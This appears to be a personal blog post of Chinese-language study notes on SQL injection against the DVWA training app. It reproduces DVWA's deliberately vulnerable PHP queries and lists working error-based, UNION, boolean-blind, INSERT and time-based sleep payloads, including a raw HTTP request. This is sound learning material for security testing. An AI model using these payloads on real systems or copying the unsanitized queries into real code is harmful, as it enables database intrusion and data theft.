<!doctype html>

<html lang="en-us">

<head>
  <title>guimaizi&#39;s blog</title>
  <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="description" content="The HTML5 Herald" />
<meta name="author" content="" /><meta property="og:title" content="从前" />
<meta property="og:description" content="title: sql注入学习笔记 url: 400.html id: 400 comments: false categories:
 安全/代码 date: 2019-02-02 15:54:26 tags:   sql注入学习 mysql数据库名:dvwa
database(),user()
mysql报错注入 &lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) { // Get values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; // Increase loop count $i&#43;&#43;; } mysql_close(); } ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.guimaizi.com/posts/sql-e6-b3-a8-e5-85-a5-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0/" />
<meta property="article:published_time" content="2020-06-06T22:23:20+08:00" />
<meta property="article:modified_time" content="2020-06-06T22:23:20+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="从前"/>
<meta name="twitter:description" content="title: sql注入学习笔记 url: 400.html id: 400 comments: false categories:
 安全/代码 date: 2019-02-02 15:54:26 tags:   sql注入学习 mysql数据库名:dvwa
database(),user()
mysql报错注入 &lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) { // Get values $first = mysql_result( $result, $i, &quot;first_name&quot; ); $last = mysql_result( $result, $i, &quot;last_name&quot; ); // Feedback for end user echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; // Increase loop count $i&#43;&#43;; } mysql_close(); } ?"/>

<meta name="generator" content="Hugo 0.72.0" />
    

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
  <link rel="stylesheet" href="https://www.guimaizi.com/fontawesome/css/all.min.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
  <link rel="stylesheet" type="text/css" href="/css/styles.css" /></head>

<body>
  <div id="container">
    <header>
      <h1>
                <a href="/">guimaizi&rsquo;s blog</a>
            </h1>

      <ul id="social-media">
             <li>
               <a href="https://github.com/guimaizi" title="GitHub">
               <i class="fab fa-github fa-lg"></i>
               </a>
             </li>
             <li>
               <a href="https://twitter.com/guimaizi" title="Twitter">
               <i class="fab fa-twitter fa-lg"></i>
               </a>
             </li>
      </ul>
      
    </header>

    
<nav>
    <ul>
        
    </ul>
</nav>


    <main>




<article>

    <h1>从前</h1>

    
      <aside>
    <ul>
        <li>
            <time class="post-date" datetime="2020-06-06T22:23:20&#43;08:00">Jun 6, 2020</time>
        </li>
        

        

        <li>3 minutes read</li>
    </ul>
</aside>

    

    


    <hr>
<p>title: sql注入学习笔记
url: 400.html
id: 400
comments: false
categories:</p>
<ul>
<li>安全/代码
date: 2019-02-02 15:54:26
tags:</li>
</ul>
<hr>
<h1 id="sql注入学习">sql注入学习</h1>
<p>mysql数据库名:dvwa<br>
database(),user()</p>
<h3 id="mysql报错注入">mysql报错注入</h3>
<pre><code>&lt;?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
    $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );

    // Get results
    $num = mysql_numrows( $result );
    $i   = 0;
    while( $i &lt; $num ) {
        // Get values
        $first = mysql_result( $result, $i, &quot;first_name&quot; );
        $last  = mysql_result( $result, $i, &quot;last_name&quot; );

        // Feedback for end user
        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;

        // Increase loop count
        $i++;
    }

    mysql_close();
}

?&gt; 
</code></pre>
<p>判断是否为sql:<br>
正常url:http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a&amp;Submit=Submit#<br>
单引号判断:http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27&amp;Submit=Submit# 页面异常<br>
<img src="https://s1.ax1x.com/2018/10/21/iByRDx.png" alt="iByRDx.png"> or 1=1&ndash; <a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27or%201=1--%20&amp;Submit=Submit#">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27or%201=1--%20&amp;Submit=Submit#</a></p>
<blockquote>
<p>$query = &ldquo;SELECT first_name, last_name FROM users WHERE user_id = &lsquo;$id&rsquo; or 1=1&rsquo;&ndash;;&quot;; 遍历出first_name, last_name字段所有数据<br>
判断表内共有列数<br>
<a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a'order">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a'order</a> by 2&ndash; &amp;Submit=Submit#<br>
出数据库用户名<br>
<a href="http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27union%20select%201,user()--%20&amp;Submit=Submit#">http://guimaizivul.qq.com/vulnerabilities/sqli/?id=a%27union%20select%201,user()--%20&amp;Submit=Submit#</a><br>
$query = &ldquo;SELECT first_name, last_name FROM users WHERE user_id = &lsquo;$id&rsquo; union select 1,user()&ndash;;'&quot;;</p>
</blockquote>
<h2 id="iby2k1pnghttpss1ax1xcom20181021iby2k1png"><img src="https://s1.ax1x.com/2018/10/21/iBy2K1.png" alt="iBy2K1.png"></h2>
<h3 id="mysql盲注">mysql盲注</h3>
<pre><code>&lt;?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot;;
    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysql_numrows( $result ); // The '@' character suppresses errors
    if( $num &gt; 0 ) {
        // Feedback for end user
        echo '&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;';
    }

    mysql_close();
}

?&gt; 
</code></pre>
<p>数据库名长度: <a href="http://guimaizivul.qq.com/vulnerabilities/sqli_blind/">http://guimaizivul.qq.com/vulnerabilities/sqli_blind/</a> ?id=a&rsquo; or length((select database()))&gt;=3 &ndash; &amp;Submit=Submit#<br>
判读数据库名:http://guimaizivul.qq.com/vulnerabilities/sqli_blind/ ?id=a&rsquo; or ascii(mid(database(),2,1))&gt;76 &ndash; &amp;Submit=Submit#<br>
<a href="http://guimaizivul.qq.com/vulnerabilities/sqli_blind/">http://guimaizivul.qq.com/vulnerabilities/sqli_blind/</a> ?id=a&rsquo; or ascii(mid(database(),1,1))=1&ndash; &amp;Submit=Submit#</p>
<h2 id="ibxvj1pnghttpss1ax1xcom20181021ibxvj1png"><img src="https://s1.ax1x.com/2018/10/21/iBXVj1.png" alt="iBXVj1.png"></h2>
<h3 id="mysql-insert注入">mysql INSERT注入</h3>
<pre><code>&lt;?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
    /*
    // Sanitize name input
    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
    */
    // Update database
    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );&quot;;
    echo $query .&quot;&lt;hr&gt;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );

    //mysql_close();
}

?&gt;


POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
Host: 192.168.0.107
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.107/DVWA/vulnerabilities/xss_s/
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Cookie: security=low; PHPSESSID=jmokhe5ce35gqiq2qvbtt516j2
Connection: close
Upgrade-Insecure-Requests: 1

txtName=1' |(select hex(database())));#&amp;mtxMessage=get_datan_ame&amp;btnSign=Sign+Guestbook
</code></pre>
<p><img src="https://s1.ax1x.com/2018/10/22/iDKBiF.png" alt="iDKBiF.png"> <img src="https://s1.ax1x.com/2018/10/22/iDKDG4.png" alt="iDKDG4.png"> txtName参数处注入 hex解码6476761 为数据库名dvwa</p>
<p>payload: * 1'|(select hex(database()))) * 1'| sleep(6))# * or sleep(6)# * and sleep(5)# * ' AND SLEEP(5) AND &lsquo;DzvZ'='DzvZ * &lsquo;%2Bsleep(5)%2B'12 * %2bsleep(5)</p>
<hr>
<p>参考资料:<br>
<a href="http://ascii.911cha.com/">ASCII码对照表</a><br>
<a href="https://www.cnblogs.com/xishaonian/p/6103505.html">Sqli-LABS通关笔录-5[SQL布尔型盲注]</a><br>
<a href="http://www.freebuf.com/column/184285.html">新手渗透测试训练营——SQL注入</a><br>
<a href="http://blackwolfsec.cc/2018/07/30/sql_update_insert/">Insert和Update型SQL注入的实践之旅</a></p>


</article>


<section class="post-nav">
    <ul>
        
        <li>
            <a href="https://www.guimaizi.com/posts/src-e6-bc-8f-e6-b4-9e-e6-8c-96-e6-8e-98-e6-b5-81-e7-a8-8b/"><i class="fa fa-chevron-circle-left"></i> 从前</a>
        </li>
        
        
        <li>
            <a href="https://www.guimaizi.com/posts/selenium-e5-bc-82-e6-ad-a5-e5-b9-b6-e5-8f-91-e6-96-b9-e6-a1-88/">从前 <i class="fa fa-chevron-circle-right"></i> </a>
        </li>
        
    </ul>
</section>
  
    
    
  





</main>
    <footer>
        <h6> |
            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
            <a href="https://www.guimaizi.com/index.xml">Subscribe </a></h6>
    </footer>
</div>
<script src="/js/scripts.js"></script>

</body>

</html>

